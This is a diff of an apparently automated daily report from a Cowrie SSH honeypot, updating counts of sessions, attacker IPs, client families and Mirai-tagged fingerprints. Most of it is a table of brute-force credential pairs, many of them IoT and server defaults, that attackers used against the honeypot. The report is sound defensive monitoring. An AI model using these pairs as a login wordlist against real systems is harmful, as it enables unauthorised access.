@@ -3,8 +3,8 @@
 | Field | Value |
 |---|---|
 | **Report Date** | 2026-08-22 |
-| **Generated At** | 2026-08-22T16:29:49Z |
-| **Shift Time** | 16:29 UTC |
+| **Generated At** | 2026-08-22T18:37:22Z |
+| **Shift Time** | 18:37 UTC |
 | **Honeypot Status** | ✅ HEALTHY |
 | **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |
 
@@ -14,15 +14,15 @@
 
 | Metric | Value |
 |---|---|
-| Total Sessions Captured | **232** |
-| Confirmed Threats | **223** |
-| False Positives Filtered | **9** (3.9%) |
-| Unique Attacker IPs | **72** |
-| Countries of Origin | **29** |
-| High Severity Cases | **183** |
+| Total Sessions Captured | **186** |
+| Confirmed Threats | **163** |
+| False Positives Filtered | **23** (12.4%) |
+| Unique Attacker IPs | **78** |
+| Countries of Origin | **34** |
+| High Severity Cases | **125** |
 | Medium Severity Cases | **0** |
-| Low Severity Cases | **49** |
-| Malware Samples Analyzed | **2** HIGH · **17** MED · 24 empty upload attempt(s) |
+| Low Severity Cases | **61** |
+| Malware Samples Analyzed | **2** HIGH · **18** MED · 24 empty upload attempt(s) |
 
 ---
 
@@ -30,238 +30,180 @@
 
 | Metric | Value |
 |---|---|
-| Total Auth Attempts | **204** |
-| Unique Credential Pairs | **151** |
-| Unique Usernames | **37** |
-| Unique Passwords | **121** |
-| Successful Auth Pairs | **192** |
+| Total Auth Attempts | **141** |
+| Unique Credential Pairs | **100** |
+| Unique Usernames | **18** |
+| Unique Passwords | **67** |
+| Successful Auth Pairs | **134** |
 
 **Top Usernames:**
 
 | Username | Attempts |
 |---|---|
-| `root` | 41 |
-| `admin` | 21 |
+| `root` | 27 |
+| `admin` | 25 |
+| `unknown` | 18 |
 | `ubuntu` | 12 |
-| `debian` | 12 |
-| `support` | 11 |
+| `centos` | 10 |
 
 **Top Passwords:**
 
 | Password | Attempts |
 |---|---|
-| `password` | 9 |
-| `123456` | 7 |
-| `support2016` | 6 |
-| `operator2023` | 6 |
-| `test2008` | 6 |
+| `1q2w3e4r` | 7 |
+| `12345` | 6 |
+| `password` | 6 |
+| `guest2019` | 6 |
+| `centos2000` | 6 |
 
 **Top Credential Pairs:**
 
 | Username | Password | Attempts |
 |---|---|---|
-| `support` | `support2016` | 6 |
-| `operator` | `operator2023` | 6 |
-| `test` | `test2008` | 6 |
-| `nobody` | `nobody2003` | 6 |
-| `user` | `user2014` | 5 |
+| `guest` | `guest2019` | 6 |
+| `centos` | `centos2000` | 6 |
+| `ubnt` | `ubnt2012` | 6 |
+| `unknown` | `1q2w3e4r` | 5 |
+| `admin` | `admin2018` | 4 |
 
 **⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**
 
 | Username | Password | Source IP | Timestamp |
 |---|---|---|---|
-| `admin` | `Password` | `195.178.110.228` | 2026-08-22T12:56:21 |
-| `root` | `P@ssword123` | `51.68.151.167` | 2026-08-22T12:57:02 |
-| `345gs5662d34` | `345gs5662d34` | `51.68.151.167` | 2026-08-22T12:57:05 |
-| `root` | `3245gs5662d34` | `51.68.151.167` | 2026-08-22T12:57:06 |
-| `support` | `support2016` | `10.0.0.73` | 2026-08-22T12:57:48 |
-| `admin` | `admin` | `195.178.110.228` | 2026-08-22T12:58:16 |
-| `ubuntu` | `shetab@123` | `217.60.255.130` | 2026-08-22T12:59:17 |
-| `root` | `Mehran@123` | `217.60.255.130` | 2026-08-22T12:59:20 |
-| `support` | `support2016` | `78.189.17.35` | 2026-08-22T12:59:21 |
-| `admin` | `admin12` | `195.178.110.228` | 2026-08-22T12:59:53 |
-| `support` | `support2024` | `37.25.36.197` | 2026-08-22T13:00:46 |
-| `support` | `support2024` | `66.179.137.169` | 2026-08-22T13:00:53 |
-| `admin` | `admin123` | `195.178.110.228` | 2026-08-22T13:01:24 |
-| `operator` | `operator2017` | `10.0.0.73` | 2026-08-22T13:01:28 |
-| `admin` | `admin2026` | `195.178.110.228` | 2026-08-22T13:02:54 |
-| `admin` | `letmein` | `195.178.110.228` | 2026-08-22T13:04:26 |
-| `admin` | `pa$w0rd` | `195.178.110.228` | 2026-08-22T13:06:00 |
-| `admin` | `passw0rd` | `195.178.110.228` | 2026-08-22T13:07:43 |
-| `ubuntu` | `Nn@123` | `217.60.255.130` | 2026-08-22T13:09:10 |
-| `root` | `123456@abcd` | `217.60.255.130` | 2026-08-22T13:09:13 |
-| `admin` | `password` | `195.178.110.228` | 2026-08-22T13:09:34 |
-| `support` | `support` | `10.0.0.73` | 2026-08-22T13:10:31 |
-| `admin` | `qwerty` | `195.178.110.228` | 2026-08-22T13:11:34 |
-| `administrator` | `123456` | `195.178.110.228` | 2026-08-22T13:13:10 |
-| `administrator` | `P@ssw0rd` | `195.178.110.228` | 2026-08-22T13:14:41 |
-| `support` | `support2016` | `93.118.164.193` | 2026-08-22T13:14:54 |
-| `support` | `support2016` | `219.73.79.33` | 2026-08-22T13:15:04 |
-| `user` | `user2014` | `10.0.0.73` | 2026-08-22T13:15:31 |
-| `administrator` | `administrator` | `195.178.110.228` | 2026-08-22T13:16:15 |
-| `administrator` | `administrator123` | `195.178.110.228` | 2026-08-22T13:17:50 |
-| `operator` | `operator2017` | `61.12.84.172` | 2026-08-22T13:17:59 |
-| `operator` | `operator2017` | `57.133.202.56` | 2026-08-22T13:18:06 |
-| `ubuntu` | `boeing747` | `217.60.255.130` | 2026-08-22T13:18:46 |
-| `root` | `hosein123` | `217.60.255.130` | 2026-08-22T13:18:50 |
-| `administrator` | `passw0rd` | `195.178.110.228` | 2026-08-22T13:19:33 |
-| `administrator` | `password` | `195.178.110.228` | 2026-08-22T13:21:25 |
-| `default` | `default2021` | `154.20.33.172` | 2026-08-22T13:23:12 |
-| `ansible` | `123456` | `195.178.110.228` | 2026-08-22T13:23:16 |
-| `default` | `default2021` | `103.67.152.201` | 2026-08-22T13:23:21 |
-| `ansible` | `ansible` | `195.178.110.228` | 2026-08-22T13:24:51 |
-| `ansible` | `ansible123` | `195.178.110.228` | 2026-08-22T13:26:32 |
-| `ansible` | `passw0rd` | `195.178.110.228` | 2026-08-22T13:28:21 |
-| `ubuntu` | `!@#123QWEqwe` | `217.60.255.130` | 2026-08-22T13:28:33 |
-| `root` | `1qazXSW@3edc` | `217.60.255.130` | 2026-08-22T13:28:37 |
-| `ansible` | `password` | `195.178.110.228` | 2026-08-22T13:30:08 |
-| `guest` | `guest2015` | `10.0.0.73` | 2026-08-22T13:30:34 |
-| `guest` | `guest2015` | `208.96.233.67` | 2026-08-22T13:31:55 |
-| `apache` | `P@ssw0rd` | `195.178.110.228` | 2026-08-22T13:31:56 |
-| `user` | `user2014` | `63.135.169.175` | 2026-08-22T13:33:27 |
-| `user` | `user2014` | `81.215.2.43` | 2026-08-22T13:33:34 |
-| `apache` | `apache` | `195.178.110.228` | 2026-08-22T13:33:47 |
-| `user` | `user2014` | `116.48.143.166` | 2026-08-22T13:33:48 |
-| `default` | `default2021` | `10.0.0.73` | 2026-08-22T13:34:23 |
-| `support` | `support` | `176.53.159.196` | 2026-08-22T13:34:58 |
-| `apache` | `password` | `195.178.110.228` | 2026-08-22T13:35:42 |
-| `backup` | `123qwe` | `195.178.110.228` | 2026-08-22T13:37:24 |
-| `ubuntu` | `a1s2d3f4` | `217.60.255.130` | 2026-08-22T13:38:19 |
-| `root` | `milad123` | `217.60.255.130` | 2026-08-22T13:38:23 |
-| `backup` | `54321` | `195.178.110.228` | 2026-08-22T13:39:05 |
-| `backup` | `backup` | `195.178.110.228` | 2026-08-22T13:40:43 |
-| `backup` | `backup12` | `195.178.110.228` | 2026-08-22T13:42:24 |
-| `backup` | `backup123` | `195.178.110.228` | 2026-08-22T13:44:45 |
-| `deploy` | `qwer1234` | `196.196.150.99` | 2026-08-22T13:45:31 |
-| `345gs5662d34` | `345gs5662d34` | `196.196.150.99` | 2026-08-22T13:45:33 |
-| `deploy` | `3245gs5662d34` | `196.196.150.99` | 2026-08-22T13:45:34 |
-| `backup` | `password` | `195.178.110.228` | 2026-08-22T13:46:21 |
-| `anne` | `anne` | `43.165.178.246` | 2026-08-22T13:47:07 |
-| `345gs5662d34` | `345gs5662d34` | `43.165.178.246` | 2026-08-22T13:47:10 |
-| `anne` | `3245gs5662d34` | `43.165.178.246` | 2026-08-22T13:47:11 |
-| `guest` | `guest2015` | `59.11.202.38` | 2026-08-22T13:47:41 |
-| `guest` | `guest2015` | `95.85.224.75` | 2026-08-22T13:47:49 |
-| `backup` | `wasd` | `195.178.110.228` | 2026-08-22T13:47:52 |
-| `ubuntu` | `zaq12wsx!` | `217.60.255.130` | 2026-08-22T13:48:01 |
-| `root` | `1qaz2wsx!QAZ@WSX` | `217.60.255.130` | 2026-08-22T13:48:05 |
-| `user` | `user2002` | `10.0.0.73` | 2026-08-22T13:48:25 |
-| `centos` | `centos` | `195.178.110.228` | 2026-08-22T13:49:23 |
-| `centos` | `centos123` | `195.178.110.228` | 2026-08-22T13:50:56 |
-| `default` | `default2021` | `175.101.14.77` | 2026-08-22T13:50:58 |
-| `default` | `default2021` | `219.129.236.174` | 2026-08-22T13:51:09 |
-| `debian` | `123456` | `195.178.110.228` | 2026-08-22T13:52:34 |
-| `debian` | `123qwe` | `195.178.110.228` | 2026-08-22T13:54:08 |
-| `debian` | `54321` | `195.178.110.228` | 2026-08-22T13:55:40 |
-| `operator` | `operator2023` | `81.237.251.198` | 2026-08-22T13:55:52 |
-| `operator` | `operator2023` | `106.0.166.123` | 2026-08-22T13:56:08 |
-| `debian` | `654321` | `195.178.110.228` | 2026-08-22T13:57:12 |
-| `ubuntu` | `123456Qq` | `217.60.255.130` | 2026-08-22T13:58:21 |
-| `root` | `123!@#QWE` | `217.60.255.130` | 2026-08-22T13:58:26 |
-| `debian` | `debian` | `195.178.110.228` | 2026-08-22T13:59:28 |
-| `debian` | `debian12` | `195.178.110.228` | 2026-08-22T14:01:04 |
-| `test` | `test2008` | `10.0.0.73` | 2026-08-22T14:03:13 |
-| `debian` | `debian123` | `195.178.110.228` | 2026-08-22T14:03:14 |
-| `debian` | `debian2026` | `195.178.110.228` | 2026-08-22T14:04:44 |
-| `test` | `test2008` | `62.122.195.14` | 2026-08-22T14:04:48 |
-| `test` | `test2008` | `103.172.11.149` | 2026-08-22T14:04:56 |
-| `user` | `user2002` | `50.217.255.171` | 2026-08-22T14:06:12 |
-| `debian` | `letmein` | `195.178.110.228` | 2026-08-22T14:06:13 |
-| `user` | `user2002` | `60.211.233.218` | 2026-08-22T14:06:25 |
-| `user` | `user2002` | `83.255.102.217` | 2026-08-22T14:06:36 |
-| `root` | `vizxv` | `77.239.124.117` | 2026-08-22T14:07:11 |
-| `operator` | `operator2023` | `10.0.0.73` | 2026-08-22T14:07:12 |
-| `root` | `xc3511` | `77.239.124.117` | 2026-08-22T14:07:13 |
-| `888888` | `888888` | `77.239.124.117` | 2026-08-22T14:07:15 |
-| `666666` | `666666` | `77.239.124.117` | 2026-08-22T14:07:16 |
-| `default` | `default` | `77.239.124.117` | 2026-08-22T14:07:18 |
-| `root` | `hi3518` | `77.239.124.117` | 2026-08-22T14:07:20 |
-| `root` | `5up` | `77.239.124.117` | 2026-08-22T14:07:22 |
-| `root` | `h8888` | `77.239.124.117` | 2026-08-22T14:07:24 |
-| `admin` | `` | `77.239.124.117` | 2026-08-22T14:07:26 |
-| `default` | `OxhlwSG8` | `77.239.124.117` | 2026-08-22T14:07:28 |
-| `default` | `lJwpbo6` | `77.239.124.117` | 2026-08-22T14:07:30 |
-| `default` | `S2fGqNFs` | `77.239.124.117` | 2026-08-22T14:07:32 |
-| `Alphanetworks` | `wrgn35_dlwbr_dir605l` | `77.239.124.117` | 2026-08-22T14:07:33 |
-| `Alphanetworks` | `wrgn76_dlwbr_dir605L` | `77.239.124.117` | 2026-08-22T14:07:35 |
-| `telecomadmin` | `admintelecom` | `77.239.124.117` | 2026-08-22T14:07:37 |
-| `root` | `solokey` | `77.239.124.117` | 2026-08-22T14:07:39 |
-| `root` | `j1/_6s*w` | `77.239.124.117` | 2026-08-22T14:07:41 |
-| `root` | `86981198` | `77.239.124.117` | 2026-08-22T14:07:43 |
-| `root` | `taZz@23495859` | `77.239.124.117` | 2026-08-22T14:07:45 |
-| `support` | `support` | `77.239.124.117` | 2026-08-22T14:07:46 |
-| `service` | `ipdongle` | `77.239.124.117` | 2026-08-22T14:07:48 |
-| `root` | `blinkadmin` | `77.239.124.117` | 2026-08-22T14:07:50 |
-| `root` | `gzhongshi` | `77.239.124.117` | 2026-08-22T14:07:52 |
-| `admin` | `adminadmi2` | `77.239.124.117` | 2026-08-22T14:07:54 |
-| `admin` | `123456` | `77.239.124.117` | 2026-08-22T14:07:56 |
-| `123456` | `123456` | `77.239.124.117` | 2026-08-22T14:07:58 |
-| `root` | `` | `77.239.124.117` | 2026-08-22T14:08:00 |
-| `admin` | `admin` | `77.239.124.117` | 2026-08-22T14:08:03 |
-| `user` | `user` | `77.239.124.117` | 2026-08-22T14:08:05 |
-| `hikvision` | `hikvision` | `77.239.124.117` | 2026-08-22T14:08:07 |
-| `ubnt` | `ubnt` | `77.239.124.117` | 2026-08-22T14:08:11 |
-| `root` | `password` | `77.239.124.117` | 2026-08-22T14:08:13 |
-| `debian` | `pa55word` | `195.178.110.228` | 2026-08-22T14:08:14 |
-| `admin` | `password` | `77.239.124.117` | 2026-08-22T14:08:15 |
-| `postgres` | `postgres` | `77.239.124.117` | 2026-08-22T14:08:18 |
-| `test` | `test` | `77.239.124.117` | 2026-08-22T14:08:20 |
-| `pi` | `raspberry` | `77.239.124.117` | 2026-08-22T14:08:23 |
-| `ftp` | `ftp` | `77.239.124.117` | 2026-08-22T14:08:25 |
-| `user` | `password` | `77.239.124.117` | 2026-08-22T14:08:27 |
-| `admin` | `admin123` | `77.239.124.117` | 2026-08-22T14:08:29 |
-| `admin` | `admin1234` | `77.239.124.117` | 2026-08-22T14:08:31 |
-| `admin` | `1234` | `77.239.124.117` | 2026-08-22T14:08:33 |
-| `root` | `12345678` | `77.239.124.117` | 2026-08-22T14:08:35 |
-| `root` | `1234` | `77.239.124.117` | 2026-08-22T14:08:37 |
-| `admin` | `12345` | `77.239.124.117` | 2026-08-22T14:08:38 |
-| `router` | `router` | `77.239.124.117` | 2026-08-22T14:08:40 |
-| `Administrator` | `Vision2` | `77.239.124.117` | 2026-08-22T14:08:42 |
-| `daemon` | `daemon` | `77.239.124.117` | 2026-08-22T14:08:44 |
-| `root` | `cat1029` | `77.239.124.117` | 2026-08-22T14:08:46 |
-| `admin` | `12345678` | `77.239.124.117` | 2026-08-22T14:08:48 |
-| `admin` | `123456789` | `77.239.124.117` | 2026-08-22T14:08:50 |
-| `ubuntu` | `password1@` | `217.60.255.130` | 2026-08-22T14:09:14 |
-| `root` | `1qaz2wsx` | `217.60.255.130` | 2026-08-22T14:09:19 |
-| `debian` | `password` | `195.178.110.228` | 2026-08-22T14:09:56 |
-| `debian` | `qwerty` | `195.178.110.228` | 2026-08-22T14:11:42 |
-| `dev` | `123qwe` | `195.178.110.228` | 2026-08-22T14:12:57 |
-| `dev` | `123qwerty` | `195.178.110.228` | 2026-08-22T14:14:15 |
-| `dev` | `54321` | `195.178.110.228` | 2026-08-22T14:15:28 |
-| `dev` | `dev` | `195.178.110.228` | 2026-08-22T14:16:39 |
-| `dev` | `dev1` | `195.178.110.228` | 2026-08-22T14:17:51 |
-| `dev` | `dev123` | `195.178.110.228` | 2026-08-22T14:19:02 |
-| `ubuntu` | `lol` | `217.60.255.130` | 2026-08-22T14:19:27 |
-| `root` | `P@ssw0rd2017` | `217.60.255.130` | 2026-08-22T14:19:31 |
-| `test` | `test2008` | `91.132.196.49` | 2026-08-22T14:20:31 |
-| `db2fenc1` | `passw0rd` | `103.193.179.139` | 2026-08-22T14:20:36 |
-| `345gs5662d34` | `345gs5662d34` | `103.193.179.139` | 2026-08-22T14:20:41 |
-| `test` | `test2008` | `222.92.61.242` | 2026-08-22T14:20:41 |
-| `db2fenc1` | `3245gs5662d34` | `103.193.179.139` | 2026-08-22T14:20:42 |
-| `nobody` | `nobody2003` | `10.0.0.73` | 2026-08-22T14:21:28 |
-| `operator` | `operator2023` | `153.37.177.219` | 2026-08-22T14:23:58 |
-| `operator` | `operator2023` | `188.147.254.153` | 2026-08-22T14:24:06 |
-| `root` | `Docker!` | `182.118.64.225` | 2026-08-22T14:27:06 |
-| `supervisor` | `12345` | `81.215.2.43` | 2026-08-22T14:28:55 |
-| `ubuntu` | `windows123` | `217.60.255.130` | 2026-08-22T14:29:26 |
-| `root` | `amir123` | `217.60.255.130` | 2026-08-22T14:29:31 |
-| `nobody` | `nobody2003` | `2.180.7.125` | 2026-08-22T14:39:04 |
-| `nobody` | `nobody2003` | `218.29.196.162` | 2026-08-22T14:39:18 |
-| `nobody` | `nobody2003` | `138.118.215.192` | 2026-08-22T14:39:18 |
-| `ubuntu` | `123456aA@` | `217.60.255.130` | 2026-08-22T14:39:22 |
-| `nobody` | `nobody2003` | `65.20.204.88` | 2026-08-22T14:39:31 |
-| `root` | `123!@#` | `217.60.255.130` | 2026-08-22T14:39:31 |
-| `supervisor` | `12345` | `10.0.0.73` | 2026-08-22T14:40:02 |
-| `root` | `000000` | `195.178.110.232` | 2026-08-22T14:40:14 |
-| `root` | `111111` | `195.178.110.232` | 2026-08-22T14:42:07 |
-| `root` | `123` | `195.178.110.232` | 2026-08-22T14:44:07 |
-| `root` | `123123` | `195.178.110.232` | 2026-08-22T14:46:09 |
-| `root` | `1234` | `195.178.110.232` | 2026-08-22T14:48:13 |
-| `ubuntu` | `Vietnam1` | `217.60.255.130` | 2026-08-22T14:49:28 |
-| `root` | `qazQAZ` | `217.60.255.130` | 2026-08-22T14:49:38 |
-| `root` | `12345` | `195.178.110.232` | 2026-08-22T14:50:16 |
-| `unknown` | `121212` | `220.246.42.212` | 2026-08-22T14:52:58 |
-| `unknown` | `121212` | `38.224.56.103` | 2026-08-22T14:53:16 |
-| `root` | `12345678` | `195.178.110.232` | 2026-08-22T14:54:18 |
+| `root` | `123456789` | `195.178.110.232` | 2026-08-22T14:56:21 |
+| `supervisor` | `12345` | `42.248.129.234` | 2026-08-22T14:56:39 |
+| `supervisor` | `12345` | `46.201.247.21` | 2026-08-22T14:56:48 |
+| `root` | `1q2w3e4r` | `195.178.110.232` | 2026-08-22T14:58:30 |
+| `ubuntu` | `Passw0rd!` | `217.60.255.130` | 2026-08-22T14:59:33 |
+| `root` | `!Qaz2wsx` | `217.60.255.130` | 2026-08-22T14:59:42 |
+| `root` | `654321` | `195.178.110.232` | 2026-08-22T15:00:32 |
+| `unknown` | `1q2w3e4r` | `213.33.204.130` | 2026-08-22T15:01:44 |
+| `root` | `P@ssw0rd` | `195.178.110.232` | 2026-08-22T15:03:06 |
+| `root` | `admin` | `195.178.110.232` | 2026-08-22T15:05:04 |
+| `root` | `admin123` | `195.178.110.232` | 2026-08-22T15:06:55 |
+| `root` | `passw0rd` | `195.178.110.232` | 2026-08-22T15:08:37 |
+| `admin` | `admin2018` | `10.0.0.73` | 2026-08-22T15:08:47 |
+| `ubuntu` | `P4ssw0rd` | `217.60.255.130` | 2026-08-22T15:09:30 |
+| `root` | `1q@W3e$R` | `217.60.255.130` | 2026-08-22T15:09:40 |
+| `root` | `password` | `195.178.110.232` | 2026-08-22T15:10:12 |
+| `admin` | `admin2018` | `218.58.73.238` | 2026-08-22T15:10:24 |
+| `unknown` | `abcd1234` | `121.22.99.2` | 2026-08-22T15:11:59 |
+| `root` | `password1` | `195.178.110.232` | 2026-08-22T15:11:59 |
+| `unknown` | `abcd1234` | `135.23.190.48` | 2026-08-22T15:12:06 |
+| `unknown` | `abcd1234` | `210.4.68.73` | 2026-08-22T15:12:15 |
+| `unknown` | `abcd1234` | `223.82.86.2` | 2026-08-22T15:12:25 |
+| `unknown` | `1q2w3e4r` | `10.0.0.73` | 2026-08-22T15:12:56 |
+| `root` | `qwerty` | `195.178.110.232` | 2026-08-22T15:13:36 |
+| `root` | `root123` | `195.178.110.232` | 2026-08-22T15:15:28 |
+| `root` | `toor` | `195.178.110.232` | 2026-08-22T15:17:04 |
+| `admin` | `000000` | `195.178.110.232` | 2026-08-22T15:18:30 |
+| `ubuntu` | `abc` | `217.60.255.130` | 2026-08-22T15:19:33 |
+| `root` | `1234!@#$` | `217.60.255.130` | 2026-08-22T15:19:44 |
+| `admin` | `111111` | `195.178.110.232` | 2026-08-22T15:20:21 |
+| `admin` | `123` | `195.178.110.232` | 2026-08-22T15:22:02 |
+| `admin` | `123123` | `195.178.110.232` | 2026-08-22T15:23:22 |
+| `admin` | `1234` | `195.178.110.232` | 2026-08-22T15:24:52 |
+| `admin` | `admin2018` | `46.201.247.21` | 2026-08-22T15:25:52 |
+| `admin` | `12345` | `195.178.110.232` | 2026-08-22T15:26:11 |
+| `guest` | `guest2019` | `10.0.0.73` | 2026-08-22T15:26:51 |
+| `admin` | `123456` | `195.178.110.232` | 2026-08-22T15:27:25 |
+| `admin` | `1234567` | `195.178.110.232` | 2026-08-22T15:28:35 |
+| `unknown` | `1q2w3e4r` | `121.1.120.2` | 2026-08-22T15:29:31 |
+| `ubuntu` | `long@123` | `217.60.255.130` | 2026-08-22T15:29:35 |
+| `unknown` | `1q2w3e4r` | `80.191.253.228` | 2026-08-22T15:29:38 |
+| `root` | `andrew23` | `217.60.255.130` | 2026-08-22T15:29:39 |
+| `admin` | `12345678` | `195.178.110.232` | 2026-08-22T15:29:54 |
+| `admin` | `123456789` | `195.178.110.232` | 2026-08-22T15:31:17 |
+| `admin` | `1q2w3e4r` | `195.178.110.232` | 2026-08-22T15:32:48 |
+| `admin` | `654321` | `195.178.110.232` | 2026-08-22T15:34:09 |
+| `admin` | `Admin123` | `195.178.110.232` | 2026-08-22T15:35:31 |
+| `root` | `LeitboGi0ro` | `64.110.90.250` | 2026-08-22T15:36:22 |
+| `root` | `123@@@` | `64.110.90.250` | 2026-08-22T15:36:22 |
+| `admin` | `P@ssw0rd` | `195.178.110.232` | 2026-08-22T15:36:53 |
+| `admin` | `admin` | `195.178.110.232` | 2026-08-22T15:38:17 |
+| `ubuntu` | `Password123@` | `217.60.255.130` | 2026-08-22T15:39:25 |
+| `root` | `p@ss123` | `217.60.255.130` | 2026-08-22T15:39:29 |
+| `admin` | `passw0rd` | `195.178.110.232` | 2026-08-22T15:39:53 |
+| `root` | `GM8182` | `195.158.88.156` | 2026-08-22T15:41:11 |
+| `centos` | `centos2000` | `10.0.0.73` | 2026-08-22T15:41:28 |
+| `admin` | `password` | `195.178.110.232` | 2026-08-22T15:41:33 |
+| `centos` | `centos2000` | `220.246.46.144` | 2026-08-22T15:42:51 |
+| `centos` | `centos2000` | `211.53.58.10` | 2026-08-22T15:43:03 |
+| `admin` | `password1` | `195.178.110.232` | 2026-08-22T15:43:13 |
+| `admin` | `qwerty` | `195.178.110.232` | 2026-08-22T15:44:32 |
+| `guest` | `guest2019` | `45.178.227.0` | 2026-08-22T15:44:35 |
+| `guest` | `guest2019` | `65.20.179.251` | 2026-08-22T15:44:43 |
+| `guest` | `guest2019` | `61.79.227.51` | 2026-08-22T15:44:47 |
+| `guest` | `guest2019` | `85.137.242.4` | 2026-08-22T15:44:58 |
+| `unknown` | `unknown2018` | `10.0.0.73` | 2026-08-22T15:45:44 |
+| `admin1` | `123123` | `195.178.110.232` | 2026-08-22T15:45:52 |
+| `admin1` | `12345` | `195.178.110.232` | 2026-08-22T15:47:19 |
+| `admin1` | `123456` | `195.178.110.232` | 2026-08-22T15:48:36 |
+| `ubuntu` | `Asdf$1234` | `217.60.255.130` | 2026-08-22T15:49:35 |
+| `root` | `ubuntu@1234` | `217.60.255.130` | 2026-08-22T15:49:39 |
+| `admin1` | `password` | `195.178.110.232` | 2026-08-22T15:49:53 |
+| `bd` | `123` | `173.249.52.138` | 2026-08-22T15:50:52 |
+| `345gs5662d34` | `345gs5662d34` | `173.249.52.138` | 2026-08-22T15:50:55 |
+| `bd` | `3245gs5662d34` | `173.249.52.138` | 2026-08-22T15:50:55 |
+| `administrator` | `123123` | `195.178.110.232` | 2026-08-22T15:51:06 |
+| `administrator` | `12345` | `195.178.110.232` | 2026-08-22T15:52:19 |
+| `administrator` | `123456` | `195.178.110.232` | 2026-08-22T15:53:42 |
+| `administrator` | `1234567` | `195.178.110.232` | 2026-08-22T15:55:05 |
+| `administrator` | `12345678` | `195.178.110.232` | 2026-08-22T15:56:27 |
+| `administrator` | `123456789` | `195.178.110.232` | 2026-08-22T15:57:48 |
+| `centos` | `centos2000` | `46.4.112.25` | 2026-08-22T15:58:27 |
+| `centos` | `centos2000` | `177.174.0.3` | 2026-08-22T15:58:34 |
+| `administrator` | `password` | `195.178.110.232` | 2026-08-22T15:59:16 |
+| `ubuntu` | `Abc123!@#` | `217.60.255.130` | 2026-08-22T15:59:42 |
+| `root` | `debian@1234` | `217.60.255.130` | 2026-08-22T15:59:47 |
+| `apache` | `12345678` | `195.178.110.232` | 2026-08-22T16:00:53 |
+| `unknown` | `unknown2018` | `72.24.210.58` | 2026-08-22T16:02:15 |
+| `unknown` | `unknown2018` | `138.84.59.192` | 2026-08-22T16:02:24 |
+| `apache` | `password` | `195.178.110.232` | 2026-08-22T16:02:30 |
+| `backup` | `123` | `195.178.110.232` | 2026-08-22T16:04:13 |
+| `backup` | `12345678` | `195.178.110.232` | 2026-08-22T16:05:35 |
+| `backup` | `backup` | `195.178.110.232` | 2026-08-22T16:06:51 |
+| `ubnt` | `ubnt2012` | `189.52.52.162` | 2026-08-22T16:07:12 |
+| `ubnt` | `ubnt2012` | `64.33.178.57` | 2026-08-22T16:07:20 |
+| `backup` | `backup123` | `195.178.110.232` | 2026-08-22T16:08:03 |
+| `backup` | `password` | `195.178.110.232` | 2026-08-22T16:09:17 |
+| `ubuntu` | `dns2022` | `217.60.255.130` | 2026-08-22T16:09:49 |
+| `root` | `wsadmin` | `217.60.255.130` | 2026-08-22T16:09:53 |
+| `centos` | `12345678` | `195.178.110.232` | 2026-08-22T16:10:35 |
+| `centos` | `654321` | `195.178.110.232` | 2026-08-22T16:12:03 |
+| `centos` | `centos` | `195.178.110.232` | 2026-08-22T16:13:29 |
+| `centos` | `centos123` | `195.178.110.232` | 2026-08-22T16:14:51 |
+| `blank` | `blank2008` | `120.243.121.6` | 2026-08-22T16:15:29 |
+| `blank` | `blank2008` | `201.28.234.10` | 2026-08-22T16:15:38 |
+| `debian` | `111111` | `195.178.110.232` | 2026-08-22T16:16:12 |
+| `config` | `config2000` | `154.20.33.172` | 2026-08-22T16:17:21 |
+| `config` | `config2000` | `103.171.39.147` | 2026-08-22T16:17:29 |
+| `config` | `config2000` | `27.223.98.117` | 2026-08-22T16:17:34 |
+| `debian` | `123123` | `195.178.110.232` | 2026-08-22T16:17:34 |
+| `config` | `config2000` | `27.115.72.122` | 2026-08-22T16:17:44 |
+| `ubnt` | `ubnt2012` | `10.0.0.73` | 2026-08-22T16:18:20 |
+| `debian` | `12345` | `195.178.110.232` | 2026-08-22T16:19:02 |
+| `ubuntu` | `abc@123` | `217.60.255.130` | 2026-08-22T16:20:00 |
+| `root` | `1234@` | `217.60.255.130` | 2026-08-22T16:20:04 |
+| `admin` | `admin` | `41.63.63.211` | 2026-08-22T16:25:35 |
+| `admin` | `admin` | `130.12.180.51` | 2026-08-22T16:25:36 |
+| `ubuntu` | `P@ssword123` | `217.60.255.130` | 2026-08-22T16:30:01 |
+| `root` | `1qaz@WSX3edc$RFV` | `217.60.255.130` | 2026-08-22T16:30:06 |
+| `blank` | `blank2008` | `101.13.1.58` | 2026-08-22T16:31:07 |
+| `unknown` | `unknown2016` | `10.0.0.73` | 2026-08-22T16:32:24 |
+| `ubnt` | `ubnt2012` | `185.246.217.106` | 2026-08-22T16:34:56 |
+| `ubnt` | `ubnt2012` | `182.75.234.236` | 2026-08-22T16:35:04 |
+| `support` | `support` | `10.0.0.73` | 2026-08-22T16:39:21 |
+| `support` | `support2024` | `210.195.205.7` | 2026-08-22T16:39:55 |
+| `ubuntu` | `qwerty12345` | `217.60.255.130` | 2026-08-22T16:40:07 |
+| `root` | `Asiatech@1234` | `217.60.255.130` | 2026-08-22T16:40:11 |
+| `unknown` | `unknown2000` | `165.99.71.193` | 2026-08-22T16:48:01 |
+| `unknown` | `unknown2000` | `121.99.190.167` | 2026-08-22T16:48:11 |
+| `unknown` | `unknown2016` | `182.42.113.10` | 2026-08-22T16:50:02 |
+| `ubuntu` | `Admin@123456` | `217.60.255.130` | 2026-08-22T16:50:03 |
+| `root` | `Armaghan@123` | `217.60.255.130` | 2026-08-22T16:50:10 |
+| `unknown` | `unknown2016` | `203.252.10.4` | 2026-08-22T16:50:11 |
+| `support` | `support2024` | `10.0.0.73` | 2026-08-22T16:51:00 |
 
 ---
 
@@ -269,41 +211,42 @@
 
 | Metric | Value |
 |---|---|
-| Total Sessions Parsed | **232** |
-| Sessions with Fingerprint | **8** |
-| Unique HASSH Fingerprints | **8** |
+| Total Sessions Parsed | **186** |
+| Sessions with Fingerprint | **10** |
+| Unique HASSH Fingerprints | **10** |
 
 **Client Family Distribution:**
 
 | Client Family | Sessions |
 |---|---|
-| Go SSH scanner | 61 |
-| libssh | 43 |
-| OpenSSH | 36 |
-| PuTTY | 1 |
+| Go SSH scanner | 58 |
+| OpenSSH | 37 |
+| libssh | 35 |
+| Paramiko (Python) | 2 |
+| Unknown | 1 |
 
 **⚠️ Botnet/Scanner KEX Signatures Detected:**
 
 | HASSH | Signature | Sessions | IPs |
 |---|---|---|---|
-| `2ec37a7cc8da...` | Mirai/variant | 59 | 2 |
-| `acaa53e0a7d7...` | Mirai/variant | 36 | 34 |
